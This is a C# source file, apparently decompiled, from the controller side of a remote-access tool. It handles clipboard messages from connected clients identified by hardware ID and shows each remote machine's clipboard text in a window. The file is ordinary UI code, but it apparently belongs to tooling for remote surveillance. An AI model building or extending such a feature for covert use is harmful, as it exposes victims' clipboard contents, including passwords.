using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerClipboard
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		string a = (string)objects[1];
		if (!(a == "Connect"))
		{
			if (!(a == "Error"))
			{
				if (!(a == "Get"))
				{
					return;
				}
				if (client.Tag == null)
				{
					client.Disconnect();
					return;
				}
				FormClipboard form = (FormClipboard)client.Tag;
				form.Invoke((MethodInvoker)delegate
				{
					form.richTextBox1.Text = (string)objects[2];
				});
			}
			else if (client.Tag == null)
			{
				client.Disconnect();
			}
			else
			{
				FormClipboard form2 = (FormClipboard)client.Tag;
				form2.Invoke((MethodInvoker)delegate
				{
					form2.richTextBox1.Text = "Error: " + (string)objects[2] + "\n";
				});
			}
			return;
		}
		FormClipboard form3 = (FormClipboard)Application.OpenForms["Clipboard:" + (string)objects[2]];
		if (form3 == null)
		{
			client.Disconnect();
			return;
		}
		form3.Invoke((MethodInvoker)delegate
		{
			form3.Text = "Clipboard [" + (string)objects[2] + "]";
			form3.client = client;
			form3.richTextBox1.Enabled = true;
			form3.rjButton1.Enabled = true;
			form3.rjButton2.Enabled = true;
			form3.rjButton3.Enabled = true;
		});
		client.Tag = form3;
		client.Hwid = (string)objects[2];
	}
}
